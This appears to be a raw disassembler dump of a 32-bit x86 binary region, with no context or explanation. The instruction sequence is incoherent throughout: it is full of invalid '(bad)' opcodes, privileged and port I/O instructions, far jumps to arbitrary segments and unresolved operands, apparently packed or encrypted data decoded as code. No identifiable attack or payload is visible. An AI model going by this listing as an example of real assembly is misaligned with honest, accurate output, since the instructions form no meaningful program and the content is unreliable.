  402966:	icebp  
  402967:	cmp    BYTE PTR [eax-0x7fd8580c],dl
  40296d:	jnp    0x40291b
  40296f:	mov    ah,0xe6
  402971:	mov    ah,0x58
  402973:	imul   ebx,DWORD PTR [ecx-0x7c5dad8a],0x6982aa70
  40297d:	arpl   WORD PTR [edx+0x17],ax
  402980:	(bad)  
  402981:	sbb    eax,0xfa0ff2ea
  402986:	retf   
  402987:	jo     0x4029bb
  402989:	sub    BYTE PTR [eax+0x3f5d2b7e],ah
  40298f:	inc    esi
  402990:	stos   BYTE PTR es:[edi],al
  402991:	psrlq  mm7,QWORD PTR [ebx+0x7d66fc3d]
  402998:	xchg   edx,eax
  402999:	pop    DWORD PTR [esi+0x2602ae1f]
  40299f:	cdq    
  4029a0:	cmp    DWORD PTR [edi-0x46],eax
  4029a3:	pop    edx
  4029a4:	mov    es:0x1e68c82e,al
  4029aa:	stos   BYTE PTR es:[edi],al
  4029ab:	xchg   esp,eax
  4029ac:	lahf   
  4029ad:	cmp    ecx,DWORD PTR [ebx+0x95ed312]
  4029b3:	mov    ebp,cs
  4029b5:	mov    BYTE PTR [ebp+0x42],0xf0
  4029b9:	jo     0x402999
  4029bb:	js     0x402a25
  4029bd:	mov    gs,ecx
  4029bf:	jae    0x402971
  4029c1:	dec    eax
  4029c2:	js     0x402979
  4029c4:	cmp    ebx,ecx
  4029c6:	sub    BYTE PTR [edx-0x2842de2],ah
  4029cc:	aas    
  4029cd:	call   0xc9d7:0x8a0ce058
  4029d4:	cmp    dl,al
  4029d6:	clc    
  4029d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029d8:	jbe    0x402a4c
  4029da:	sbb    BYTE PTR [eax],bl
  4029dc:	fucom  st(4)
  4029de:	fidiv  WORD PTR [eax+0x2e]
  4029e1:	inc    ebx
  4029e2:	sar    BYTE PTR [eax],0x5a
  4029e5:	xor    al,0xd7
  4029e7:	push   esi
  4029e8:	cwde   
  4029e9:	sub    al,0x83
  4029eb:	add    eax,0x8b19bc9
  4029f0:	lods   eax,DWORD PTR ds:[esi]
  4029f1:	enter  0x56b9,0x5f
  4029f5:	or     al,0xe2
  4029f7:	dec    edi
  4029f8:	mov    dl,0x21
  4029fa:	mov    cl,0xe5
  4029fc:	mov    esi,0x1987c7ef
  402a01:	fcom   st(5)
  402a03:	push   esi
  402a04:	inc    eax
  402a05:	dec    edx
  402a06:	add    BYTE PTR [edx+ebp*8],dl
  402a09:	dec    ebx
  402a0a:	(bad)  
  402a0b:	icebp  
  402a0c:	(bad)  
  402a0d:	jge    0x402a1f
  402a0f:	jle    0x4029ec
  402a11:	mov    dl,0x9
  402a13:	test   eax,0x862cf0ca
  402a18:	fild   DWORD PTR [ebx+0x70]
  402a1b:	adc    ebx,DWORD PTR [eax]
  402a1d:	fisub  WORD PTR [ebx+0x55]
  402a20:	das    
  402a21:	aaa    
  402a22:	inc    eax
  402a23:	cmp    esi,ebp
  402a25:	xchg   ebp,eax
  402a26:	push   esi
  402a27:	dec    edx
  402a28:	mov    al,ds:0xad983045
  402a2d:	loope  0x402a15
  402a2f:	hlt    
  402a30:	ins    BYTE PTR es:[edi],dx
  402a31:	pop    ebp
  402a32:	stc    
  402a33:	jne    0x4029d6
  402a35:	push   cs
  402a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a37:	out    0x66,eax
  402a39:	mov    dh,0xeb
  402a3b:	mov    gs,edx
  402a3d:	push   0xce7cef8
  402a42:	cmp    ebp,ebp
  402a44:	cmp    DWORD PTR ss:[ebp+0x4b],ebx
  402a48:	mov    ?,WORD PTR [eax+0x27864872]
  402a4e:	bound  ecx,QWORD PTR [edx-0x4f7f78fe]
  402a54:	outs   dx,BYTE PTR ds:[esi]
  402a55:	enter  0x82f1,0xb8
  402a59:	push   ss
  402a5a:	sti    
  402a5b:	retf   0x2a49
  402a5e:	xchg   ecx,eax
  402a5f:	cmc    
  402a60:	pop    DWORD PTR [eax-0x38]
  402a63:	adc    eax,0xec08be08
  402a68:	test   DWORD PTR [si],ebp
  402a6b:	or     eax,DWORD PTR [ecx]
  402a6d:	mov    esp,0x5273d583
  402a72:	mov    ecx,0x24502047
  402a77:	fs test cl,bh
  402a7a:	aas    
  402a7b:	(bad)  
  402a7c:	push   ss
  402a7d:	repnz into 
  402a7f:	lods   eax,DWORD PTR ds:[esi]
  402a80:	add    BYTE PTR [ebx],bh
  402a82:	call   0x289e:0x6e6d81f6
  402a89:	inc    ecx
  402a8a:	mov    ecx,0xfc26d302
  402a8f:	inc    ecx
  402a90:	xor    DWORD PTR [eax-0x7e],eax
  402a93:	aad    0xfb
  402a95:	inc    ebp
  402a96:	retf   0xb5ca
  402a99:	sbb    eax,0xfe089ed6
  402a9e:	add    al,0x4d
  402aa0:	sahf   
  402aa1:	(bad)  
  402aa2:	mov    BYTE PTR [edx+0x5f4159f2],al
  402aa8:	rdmsr  
  402aaa:	mov    BYTE PTR [ecx+0x60],dl
  402aad:	and    bh,ch
  402aaf:	in     al,0x6
  402ab1:	inc    edi
  402ab2:	jnp    0x402a3b
  402ab4:	dec    ecx
  402ab5:	or     al,0xe8
  402ab7:	test   eax,0xe012913b
  402abc:	and    ecx,DWORD PTR [ebx]
  402abe:	rol    DWORD PTR [edi+eiz*8],0xd8
  402ac2:	mov    edx,0x1c144c41
  402ac7:	and    DWORD PTR [edx+0x7],ecx
  402aca:	xor    DWORD PTR [ecx+0x68fe6629],0xffffffbf
  402ad1:	cwde   
  402ad2:	pop    es
  402ad3:	pop    eax
  402ad4:	sub    edi,DWORD PTR [ecx+0x5b]
  402ad7:	pop    ebx
  402ad8:	test   DWORD PTR [edx-0x61],edx
  402adb:	out    dx,al
  402adc:	(bad)  
  402ade:	dec    ecx
  402adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ae0:	arpl   WORD PTR [esi+0x3c],dx
  402ae3:	ins    BYTE PTR es:[edi],dx
  402ae4:	cmp    DWORD PTR [edx+edx*8],esp
  402ae7:	mov    al,0x40
  402ae9:	aas    
  402aea:	sub    al,0x57
  402aec:	jmp    FWORD PTR [ecx+0x1be6da53]
  402af2:	daa    
  402af3:	pop    ebx
  402af4:	pop    edi
  402af5:	inc    eax
  402af6:	das    
  402af7:	jb     0x402b4b
  402af9:	in     al,0x4b
  402afb:	lds    ecx,FWORD PTR [ebx+esi*8]
  402afe:	inc    ebp
  402aff:	add    bl,BYTE PTR [edi-0x5c]
  402b02:	iret   
  402b03:	pusha  
  402b04:	cmp    eax,0x9eb03d48
  402b09:	cdq    
  402b0a:	mov    ds:0x799c82a9,al
  402b0f:	icebp  
  402b10:	mov    BYTE PTR [eax],ah
  402b12:	enter  0xa74c,0x1b
  402b16:	pop    ss
  402b17:	les    esi,FWORD PTR [eax-0x5f]
  402b1a:	scas   eax,DWORD PTR es:[edi]
  402b1b:	dec    esp
  402b1c:	out    0x4,al
  402b1e:	jno    0x402b82
  402b20:	mov    BYTE PTR ds:0x5b2b336b,al
  402b26:	push   ebp
  402b27:	scas   al,BYTE PTR es:[edi]
  402b28:	data16 clc 
  402b2a:	xchg   esp,eax
  402b2b:	sbb    DWORD PTR [edi+esi*2+0x16fd3a74],0xe414d9ce
  402b36:	push   edx
  402b37:	fld    DWORD PTR [ecx-0x5ecc6c4f]
  402b3d:	push   esp
  402b3f:	out    0xe1,eax
  402b41:	and    dh,0xda
  402b44:	int    0x0
  402b46:	xchg   ebp,eax
  402b47:	ja     0x402ba5
  402b49:	inc    esi
  402b4a:	or     DWORD PTR [esp+ebp*2],ecx
  402b4d:	fstp   st(4)
  402b4f:	inc    esp
  402b50:	cmp    al,0x6b
  402b52:	mov    ah,0x6d
  402b54:	jno    0x402b74
  402b56:	mov    es,eax
  402b58:	lahf   
  402b59:	cs test eax,0xcd251503
  402b5f:	push   ds
  402b60:	add    dl,BYTE PTR [ecx+0x51]
  402b63:	scas   al,BYTE PTR es:[edi]
  402b64:	enter  0x6985,0x3b
  402b68:	rcr    eax,1
  402b6a:	push   edi
  402b6b:	test   eax,0x961ddbd2
  402b70:	pushf  
  402b71:	push   cs
  402b72:	xchg   ebp,eax
  402b73:	out    dx,eax
  402b74:	test   al,0xec
  402b76:	inc    eax
  402b77:	lods   eax,DWORD PTR ds:[esi]
  402b78:	pusha  
  402b79:	ror    edi,1
  402b7b:	jmp    0x5ed9:0x7456464c
  402b82:	sar    BYTE PTR [ecx-0x3d],0x56
  402b86:	mov    edi,0x55f82bdc
  402b8b:	dec    eax
  402b8c:	mov    ch,bh
  402b8e:	into   
  402b8f:	ret    0x5f49
  402b92:	js     0x402b3b
  402b94:	stos   DWORD PTR es:[edi],eax
  402b95:	and    ah,BYTE PTR [eax+edi*2+0x115bf0b4]
  402b9c:	adc    BYTE PTR [edx+edi*2-0x18595d9d],0x1e
  402ba4:	adc    BYTE PTR [edi+0x3a],bh
  402ba7:	ficom  DWORD PTR [esi]
  402ba9:	or     BYTE PTR [edi-0x370bb247],ah
  402baf:	dec    ebp
  402bb0:	or     edi,DWORD PTR [ebx-0x478380fc]
  402bb6:	cli    
  402bb7:	dec    esi
  402bb8:	cmp    ch,bh
  402bba:	test   al,dh
  402bbc:	cwde   
  402bbd:	cmp    BYTE PTR [ebx+eiz*2],bl
  402bc0:	sub    eax,0xa3795a3e
  402bc5:	push   esi
  402bc6:	or     BYTE PTR [ecx+0x75],dl
  402bc9:	mov    ah,0x75
  402bcb:	jmp    0xeef:0x66338a72
  402bd2:	shr    DWORD PTR [esi+0x768bed60],cl
  402bd8:	push   esi
  402bd9:	gs test al,0xf3
  402bdc:	shl    DWORD PTR [eax],0x53
  402bdf:	inc    edx
  402be0:	mov    ebx,0x9e9cc204
  402be5:	inc    ebp
  402be6:	jle    0x402c4d
  402be8:	ja     0x402c67
  402bea:	dec    ecx
  402beb:	xchg   ebx,eax
  402bec:	pop    esi
  402bed:	xor    dl,ch
  402bef:	pushf  
  402bf0:	fsubr  DWORD PTR [edx+0x76d2c6cd]
  402bf6:	mov    bh,0x20
  402bf8:	and    al,0xbc
  402bfa:	cmp    dl,BYTE PTR [edx+0x5654f8f4]
  402c00:	sbb    eax,0x44763080
  402c05:	out    0x70,eax
  402c07:	xchg   esi,eax
  402c08:	fistp  DWORD PTR [ebx]
  402c0a:	or     eax,0xe28850c0
  402c0f:	pushf  
  402c10:	shl    edi,1
  402c12:	xor    ebx,ecx
  402c14:	pop    ecx
  402c15:	cld    
  402c16:	jmp    0xd5c5:0x33f91ef0
  402c1d:	pop    esi
  402c1e:	inc    esp
  402c1f:	outs   dx,DWORD PTR ds:[esi]
  402c20:	and    cl,ah
  402c22:	(bad)  
  402c23:	mov    bh,0x55
  402c25:	mov    dh,0xc6
  402c27:	mov    eax,ds:0x5a88b85f
  402c2c:	jp     0x402bf7
  402c2e:	scas   al,BYTE PTR es:[edi]
  402c2f:	in     al,0xba
  402c31:	int    0xb5
  402c33:	xor    eax,0x4f12fc1d
  402c38:	rcr    DWORD PTR [edx-0x23],0xbe
  402c3c:	jae    0x402c77
  402c3e:	shl    DWORD PTR [ecx+0x37c73f21],cl
  402c44:	aas    
  402c45:	fs push ebp
  402c47:	cwde   
  402c48:	sahf   
  402c49:	jl     0x402bea
  402c4b:	retf   0xa567
  402c4e:	sbb    edx,esi
  402c50:	retf   
  402c51:	mov    esi,0x29f10ccb
  402c56:	push   edx
  402c57:	(bad)  
  402c58:	mov    eax,0x15bbc92c
  402c5d:	xchg   ecx,eax
  402c5e:	scas   al,BYTE PTR es:[edi]
  402c5f:	in     al,0xbb
  402c61:	fimul  WORD PTR [edx]
  402c63:	xlat   BYTE PTR ds:[ebx]
  402c64:	xor    al,0x55
  402c66:	and    bx,WORD PTR [ecx+edx*4+0x1b84021e]
  402c6e:	or     ebx,DWORD PTR [ebx+edx*2-0x1b]
  402c72:	jmp    0xc2ff:0x9f3d5389
  402c79:	fwait
  402c7a:	adc    eax,0x97a4c4e2
  402c7f:	pop    ebp
  402c80:	lods   eax,DWORD PTR ds:[esi]
  402c81:	mov    eax,ds:0x550866c
  402c86:	out    0xca,eax
  402c88:	mov    ds:0x3357d7b,al
  402c8d:	daa    
  402c8e:	cli    
  402c8f:	jns    0x402c4b
  402c91:	sbb    BYTE PTR [ecx+0x5cf7fbc8],ch
  402c97:	es aad 0xb6
  402c9a:	fisub  WORD PTR [ebx+eiz*4]
  402c9d:	jb     0x402cee
  402c9f:	adc    eax,DWORD PTR [ebx-0x339e0164]
  402ca5:	cmp    BYTE PTR [ecx],0xe8
  402ca8:	jle    0x402cc9
  402caa:	jmp    0x8860:0x30bff2b8
  402cb1:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb3:	or     dl,cl
  402cb5:	(bad)  
  402cb6:	ret    0x7e56
  402cb9:	nop
  402cba:	daa    
  402cbb:	lock das 
  402cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cbe:	inc    ebx
  402cbf:	xchg   esp,eax
  402cc0:	arpl   di,si
  402cc2:	fld    DWORD PTR [edx-0x7c8a3f44]
  402cc8:	repz ss jne 0x402ca0
  402ccc:	jp     0x402d37
  402cce:	and    al,0xbd
  402cd0:	out    0x28,eax
  402cd2:	mov    edx,0x1b762be9
  402cd7:	scas   al,BYTE PTR es:[edi]
  402cd8:	arpl   WORD PTR [edx-0x9],dx
  402cdb:	adc    BYTE PTR [ebx+0x31434309],bl
  402ce1:	in     al,dx
  402ce2:	out    dx,al
  402ce3:	retf   0x80a1
  402ce6:	pop    esp
  402ce7:	cwde   
  402ce8:	jbe    0x402cd8
  402cea:	mov    eax,0x8c5ea03f
  402cef:	sbb    BYTE PTR [edx+edx*1+0x2c],cl
  402cf3:	jecxz  0x402c90
  402cf5:	cmp    al,0x7c
  402cf7:	dec    ecx
  402cf8:	mov    esi,0x1d0767c
  402cfd:	push   ebx
  402cfe:	push   0xffffffbc
  402d00:	pop    ebx
  402d01:	mov    bh,0x54
  402d03:	cli    
  402d04:	sbb    edx,eax
  402d06:	adc    eax,0xfb1c0e9e
  402d0b:	dec    edx
  402d0c:	jl     0x402d2f
  402d0e:	test   al,0xa4
  402d10:	int    0xb3
  402d12:	sahf   
  402d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d14:	xchg   ebp,eax
  402d15:	imul   edi,DWORD PTR [esp+ebx*8],0xffffffdb
  402d19:	sub    BYTE PTR [ebx+eiz*8],al
  402d1c:	imul   esi,DWORD PTR [ecx],0x70
  402d1f:	test   DWORD PTR [esi],ebx
  402d21:	mov    ds:0x996b4134,al
  402d26:	pushf  
  402d27:	test   eax,0xb17d70dc
  402d2c:	sbb    BYTE PTR [ebp-0x50],bh
  402d2f:	adc    BYTE PTR [ebp+eiz*8+0x61],dl
  402d33:	inc    edi
  402d34:	xchg   edx,eax
  402d35:	xor    al,0xe2
  402d37:	fist   WORD PTR [esi]
  402d39:	inc    edx
  402d3a:	pop    edx
  402d3b:	test   bl,bh
  402d3d:	ja     0x402d07
  402d3f:	outs   dx,BYTE PTR ds:[esi]
  402d40:	sub    DWORD PTR [eax+0x30fa3ce9],ecx
  402d46:	call   0x4d9f3c80
  402d4b:	inc    esp
  402d4c:	enter  0xb51e,0xb6
  402d50:	ret    0x3b38
  402d53:	jno    0x402ce6
  402d55:	pop    es
  402d56:	xchg   ebp,ebx
  402d58:	in     al,0x7b
  402d5a:	icebp  
  402d5b:	pop    edi
  402d5c:	jnp    0x402d3e
  402d5e:	repz jne 0x402ce7
  402d61:	mov    esi,0xaf786d87
  402d66:	adc    eax,0x674a7717
  402d6b:	push   ebp
  402d6c:	xlat   BYTE PTR ds:[ebx]
  402d6d:	std    
  402d6e:	xor    cl,BYTE PTR [ebp+0x27]
  402d71:	mov    ds:0xed47b94b,al
  402d76:	test   esp,ebp
  402d78:	dec    esp
  402d79:	mov    eax,0x74317d16
  402d7e:	push   ebp
  402d7f:	or     BYTE PTR ds:0x455430dc,bl
  402d85:	rol    eax,0x6d
  402d88:	(bad)  
  402d89:	rcl    BYTE PTR [edx-0x7b],cl
  402d8c:	stos   DWORD PTR es:[edi],eax
  402d8d:	in     eax,dx
  402d8e:	xchg   esi,eax
  402d8f:	cmp    eax,0xc44e44f6
  402d94:	scas   eax,DWORD PTR es:[edi]
  402d95:	(bad)  
  402d96:	call   0x65ce3bc9
  402d9b:	test   al,0x67
  402d9d:	lea    ebp,[edi+esi*1-0x4d]
  402da1:	xchg   edx,eax
  402da2:	and    ecx,DWORD PTR [esi-0x1b]
  402da5:	popf   
  402da6:	jg     0x402dba
  402da8:	pusha  
  402da9:	test   al,0x60
  402dab:	push   cs
  402dac:	xchg   ecx,eax
  402dad:	das    
  402dae:	rol    cl,1
  402db0:	jae    0x402d91
  402db2:	push   ds
  402db3:	sbb    ebx,esp
  402db5:	cmp    eax,0x8fad8cdc
  402dba:	int    0x18
  402dbc:	setle  BYTE PTR [edi]
  402dbf:	pop    edx
  402dc0:	mov    gs,WORD PTR [ebx-0x50]
  402dc3:	or     ebx,edi
  402dc5:	lahf   
  402dc6:	and    DWORD PTR [esi-0x5448b20b],ecx
  402dcc:	pop    edi
  402dcd:	dec    ecx
  402dce:	lds    eax,FWORD PTR [ebx+0x63]
  402dd1:	sub    ebx,DWORD PTR ds:0xddb5222e
  402dd7:	mov    DWORD PTR [edx+0x17730ce7],esp
  402ddd:	aaa    
  402dde:	sub    esi,edx
  402de0:	popf   
  402de1:	inc    esi
  402de2:	into   
  402de3:	(bad)  
  402de5:	and    ch,BYTE PTR [ebx]
  402de7:	xor    edx,esi
  402de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dea:	mov    ebp,0x9f6a7b29
  402def:	ds out dx,al
  402df1:	lods   eax,DWORD PTR ds:[esi]
  402df2:	div    BYTE PTR ds:0xf26fbaaf
  402df8:	dec    ecx
  402df9:	inc    ebx
  402dfa:	div    BYTE PTR [ebp-0x278ac4b7]
  402e00:	adc    al,0x6
  402e02:	bound  ebp,QWORD PTR [ebx-0x3b12cf41]
  402e08:	js     0x402e04
  402e0a:	or     DWORD PTR [ecx+0x3d],ebx
  402e0d:	mov    ah,0x22
  402e0f:	stc    
  402e10:	xchg   esp,eax
  402e11:	mov    ebx,0xb2d4abad
  402e16:	nop
  402e17:	jo     0x402daf
  402e19:	rol    DWORD PTR [ebx],cl
  402e1b:	mov    bh,0x2f
  402e1d:	jnp    0x402e37
  402e1f:	add    DWORD PTR [ecx-0x1235fc5b],esp
  402e25:	push   0xdd7f4025
  402e2a:	popf   
  402e2b:	(bad)  
  402e2c:	out    0x77,eax
  402e2e:	sar    DWORD PTR [ebp+0x1a22595a],1
  402e34:	xchg   edx,eax
  402e35:	out    0x8,al
  402e37:	enter  0x6e1f,0xc
  402e3b:	ins    DWORD PTR es:[edi],dx
  402e3c:	and    al,0x52
  402e3e:	popa   
  402e3f:	pop    eax
  402e40:	dec    ebp
  402e41:	jecxz  0x402e73
  402e43:	mov    dl,0x88
  402e45:	jp     0x402dd3
  402e47:	ret    0x7e36
  402e4a:	mov    ebp,ss
  402e4c:	xor    eax,0xa2da6c0e
  402e51:	inc    esi
  402e52:	(bad)  
  402e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e54:	cmp    eax,0x22791ae1
  402e59:	sub    DWORD PTR [ecx],esi
  402e5b:	pop    ss
  402e5c:	pop    ebx
  402e5d:	add    DWORD PTR [edx-0x13ddbb5f],0x28
  402e64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e65:	push   ebp
  402e66:	cmp    eax,0xfed5ca3
  402e6b:	and    ebp,esp
  402e6d:	add    eax,0xd5400fa4
  402e72:	xchg   BYTE PTR [edi*4-0x7aa148f3],ah
  402e79:	push   ds
  402e7a:	xor    BYTE PTR [eax],0xfe
  402e7d:	mov    dl,0x6d
  402e7f:	hlt    
  402e80:	jge    0x402e65
  402e82:	ins    DWORD PTR es:[edi],dx
  402e83:	xchg   esp,eax
  402e84:	cmp    ebp,ebx
  402e86:	xor    bh,BYTE PTR [esi+edi*2]
  402e89:	push   0x889bc248
  402e8e:	jmp    0x402ee9
  402e90:	sub    al,0xaf
  402e92:	dec    ecx
  402e93:	jmp    0x1d35abf7
  402e98:	js     0x402e6a
  402e9a:	into   
  402e9b:	jp     0x402ea1
  402e9d:	data16 fld DWORD PTR [esi]
  402ea0:	mov    al,0x38
  402ea2:	sub    DWORD PTR [ebx],edx
  402ea4:	or     eax,0x266154a5
  402ea9:	mov    BYTE PTR ds:0x5a5eb12,0x6d
  402eb0:	fiadd  WORD PTR [edi]
  402eb2:	mov    dh,0xa3
  402eb4:	mov    ecx,0x4d9f8100
  402eb9:	jnp    0x402eaf
  402ebb:	aad    0xdd
  402ebd:	jae    0x402e82
  402ebf:	push   0x7
  402ec1:	pop    ecx
  402ec2:	loope  0x402f3d
  402ec4:	xor    BYTE PTR [edx],dh
  402ec6:	cmp    eax,0x4145594f
  402ecb:	stc    
  402ecc:	retf   0x925
  402ecf:	shr    DWORD PTR [eax-0x80],0x79
  402ed3:	adc    BYTE PTR [ebx+0xac0ba93],0x19
  402eda:	nop
  402edb:	xchg   al,al
  402edd:	sub    bl,BYTE PTR [ebp-0x5b3b5050]
  402ee3:	(bad)  
  402ee4:	cmp    edx,DWORD PTR [ebx+0x3451b6ac]
  402eea:	scas   al,BYTE PTR es:[edi]
  402eeb:	out    0x48,eax
  402eed:	(bad)  
  402eee:	imul   ebp,DWORD PTR [ecx+0x2d],0x8a1d64a5
  402ef5:	sub    eax,0x1590dc9
  402efa:	mov    ah,0xd9
  402efc:	mov    ecx,ss
  402efe:	push   ecx
  402eff:	test   BYTE PTR [ebx+0x5addd42f],dh
  402f05:	mov    dl,al
  402f07:	sbb    cl,BYTE PTR [ebx]
  402f09:	push   ss
  402f0a:	inc    eax
  402f0b:	cmp    edx,DWORD PTR [ebx-0x526b8ad1]
  402f11:	push   esi
  402f12:	mov    bh,0xb2
  402f14:	data16 aas 
  402f16:	fistp  WORD PTR [ebp+0x1f]
  402f19:	into   
  402f1a:	in     eax,0xe
  402f1c:	and    eax,0xb1f1f132
  402f21:	pop    ebx
  402f22:	(bad)  [esi]
  402f24:	add    BYTE PTR [esi+0x2c22fb3],0x10
  402f2b:	xlat   BYTE PTR ds:[ebx]
  402f2c:	stc    
  402f2d:	sahf   
  402f2e:	mov    cl,0xfd
  402f30:	dec    eax
  402f31:	cmp    ebp,DWORD PTR [esi-0x13]
  402f34:	outs   dx,BYTE PTR ds:[esi]
  402f35:	adc    al,0x3c
  402f37:	sbb    al,0xb2
  402f39:	inc    ebp
  402f3a:	lds    edi,FWORD PTR [ebp+0x1a]
  402f3d:	rol    BYTE PTR [ebp+0x5f152400],1
  402f43:	pop    ss
  402f44:	xorps  xmm7,XMMWORD PTR [ebx]
  402f47:	cmp    BYTE PTR [eax+0x36a782c5],bl
  402f4d:	std    
  402f4e:	push   cs
  402f4f:	cmp    esp,ebp
  402f51:	fdiv   QWORD PTR [edi]
  402f53:	jo     0x402f34
  402f55:	in     al,dx
  402f56:	scas   eax,DWORD PTR es:[edi]
  402f57:	push   0x24
  402f59:	rcl    BYTE PTR [edx-0x4f7979b0],cl
  402f5f:	jp     0x402f56
  402f61:	sti    
  402f62:	lahf   
  402f63:	inc    edi
  402f64:	sahf   
  402f65:	inc    eax
  402f66:	push   edi
  402f67:	cwde   
  402f68:	ret    0xf68e
  402f6b:	sar    DWORD PTR [edi+0x1692ad0e],cl
  402f71:	push   0xd4f57cc
  402f76:	sub    eax,0xfa9ecf0f
  402f7b:	xchg   esi,eax
  402f7c:	pop    es
  402f7d:	test   BYTE PTR [esi],dl
  402f7f:	or     DWORD PTR [ebx+0x6c7682f],edi
  402f85:	mov    ?,WORD PTR [esi+0x4e]
  402f88:	cmp    edi,DWORD PTR [bx+si]
  402f8b:	(bad)  
  402f8c:	cld    
  402f8d:	ret    
  402f8e:	sub    eax,eax
  402f90:	addr16 pop esp
  402f92:	inc    edi
  402f93:	fadd   DWORD PTR [ebx]
  402f95:	bound  esp,QWORD PTR [edx]
  402f97:	adc    BYTE PTR [ebp-0x187dd3c5],dl
  402f9d:	or     al,BYTE PTR [edi]
  402f9f:	aas    
  402fa0:	(bad)  
  402fa1:	loopne 0x402f65
  402fa3:	out    0x7b,eax
  402fa5:	pop    ss
  402fa6:	dec    ebx
  402fa7:	test   eax,0x58b16295
  402fac:	cld    
  402fad:	and    eax,0x6b587414
  402fb2:	mov    cl,0xd6
  402fb4:	push   edx
  402fb5:	sbb    eax,0xd46f30e8
  402fba:	pop    eax
  402fbb:	xchg   ebx,eax
  402fbc:	cmp    DWORD PTR [edi-0xa],eax
  402fbf:	mov    bh,BYTE PTR [ecx]
  402fc1:	inc    esi
  402fc2:	cmc    
  402fc3:	retf   0xaa10
  402fc6:	fadd   st,st(0)
  402fc8:	pop    ebp
  402fc9:	cld    
  402fca:	xor    al,0xe0
  402fcc:	in     al,0xbe
  402fce:	add    eax,0x3d9ac64e
  402fd3:	sub    ecx,DWORD PTR [edx]
  402fd5:	jo     0x402f57
  402fd7:	dec    edx
  402fd8:	mov    BYTE PTR [eax],dl
  402fda:	pop    ecx
  402fdb:	push   ds
  402fdc:	fsubr  DWORD PTR [esp+ebp*1]
  402fdf:	shr    DWORD PTR [edx-0x55f6331e],0xe4
  402fe6:	daa    
  402fe7:	or     edx,DWORD PTR [ecx+0x27]
  402fea:	push   eax
  402feb:	fwait
  402fec:	jg     0x402fc0
  402fee:	aad    0xe
  402ff0:	sar    DWORD PTR [ecx+0x9af5e93],cl
  402ff6:	(bad)  
  402ff8:	idiv   esp
  402ffa:	leave  
  402ffb:	aam    0x2d
  402ffd:	add    BYTE PTR [esi],dl
  402fff:	pop    ecx
  403000:	gs push 0x7c
  403003:	mov    BYTE PTR [ecx-0x4],ch
  403006:	dec    esp
  403007:	ss pop esp
  403009:	add    DWORD PTR [edx-0x6bc95e58],eax
  40300f:	sbb    al,0xb0
  403011:	loope  0x403042
  403013:	int3   
  403014:	nop
  403015:	nop
  403016:	mov    cl,0x7d
  403018:	cmp    DWORD PTR [ebp-0x42f9fca5],0x937ee95
  403022:	push   eax
  403023:	cmp    esi,DWORD PTR [edx-0x1e3433c0]
  403029:	int    0xfb
  40302b:	pop    esp
  40302c:	mov    BYTE PTR [ebx+0x3c],dl
  40302f:	mov    al,0x6e
  403031:	aaa    
  403032:	out    0x3,eax
  403034:	push   ebp
  403035:	cmp    al,BYTE PTR [edx+0x3e1aa7db]
  40303b:	and    eax,ecx
  40303d:	pop    edi
  40303e:	stc    
  40303f:	or     DWORD PTR [edi+0x33896ccf],ebx
  403045:	setg   BYTE PTR [esi+ecx*2-0x732dfcf0]
  40304d:	iret   
  40304e:	or     BYTE PTR [eax-0x4b],dl
  403051:	icebp  
  403052:	ss out dx,eax
  403054:	lods   eax,DWORD PTR ds:[esi]
  403055:	xchg   DWORD PTR [eax],edx
  403057:	cs call 0x9ead48b7
  40305d:	sub    dl,BYTE PTR [esi]
  40305f:	arpl   WORD PTR [ebp+0x2217b7c6],dx
  403065:	std    
  403066:	mov    dl,0xb1
  403068:	mov    bh,0x25
  40306a:	retf   0xb0dc
  40306d:	inc    ebp
  40306e:	gs in  al,0xd9
  403071:	and    al,bh
  403073:	iret   
  403074:	pusha  
  403075:	dec    ebx
  403076:	aas    
  403077:	jecxz  0x4030b3
  403079:	adc    dh,0x7c
  40307c:	rcl    eax,cl
  40307e:	(bad)  
  40307f:	sub    ebp,DWORD PTR [eax+0x73428200]
  403085:	arpl   si,ax
  403087:	shl    ebp,cl
  403089:	aam    0xf6
  40308b:	or     al,0xe2
  40308d:	rcr    DWORD PTR [eax+ebx*4],1
  403090:	mov    BYTE PTR [ebp+0x452c32ab],bl
  403096:	enter  0x965e,0x5c
  40309a:	ror    DWORD PTR [esi+0x1b4e298f],0xe5
  4030a1:	repnz test DWORD PTR [edi-0x64b9d1f0],edx
  4030a8:	mov    BYTE PTR [esi-0x53],0x48
  4030ac:	push   esi
  4030ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030ae:	push   es
  4030af:	or     esp,0xffffffc5
  4030b2:	add    al,0xda
  4030b4:	dec    esi
  4030b5:	and    eax,0x1b764738
  4030ba:	or     DWORD PTR [edx],ebp
  4030bc:	into   
  4030bd:	mov    esi,0x9537a970
  4030c2:	(bad)  
  4030c3:	and    al,bh
  4030c5:	data16 jae 0x4030a2
  4030c8:	sub    edi,eax
  4030ca:	cmp    cl,dh
  4030cc:	sbb    ebp,DWORD PTR [ebx+eax*8+0x3]
  4030d0:	mov    bl,0xa2
  4030d2:	(bad)  
  4030d3:	nop
  4030d4:	pop    ds
  4030d5:	jne    0x40306e
  4030d7:	lods   al,BYTE PTR ds:[esi]
  4030d8:	pop    eax
  4030d9:	or     edx,ebp
  4030db:	sbb    BYTE PTR [esi-0x21],cl
  4030de:	arpl   WORD PTR [ecx+0x31],di
  4030e1:	xlat   BYTE PTR ds:[ebx]
  4030e2:	mov    eax,0x7e4b2bbb
  4030e7:	and    esp,eax
  4030e9:	fbstp  TBYTE PTR [edx]
  4030eb:	xchg   ebx,eax
  4030ec:	mov    esi,0xb8f60649
  4030f1:	dec    esi
  4030f2:	test   eax,0xeda471d3
  4030f7:	std    
  4030f8:	add    DWORD PTR [eax],ebx
  4030fa:	out    dx,al
  4030fb:	or     al,0xe8
  4030fd:	xchg   ebx,eax
  4030fe:	mov    edx,0xe89ff7cf
  403103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403104:	sbb    ch,ch
  403106:	imul   ebx,DWORD PTR [ecx+edi*1+0x2a],0xa03d6342
  40310e:	(bad)  
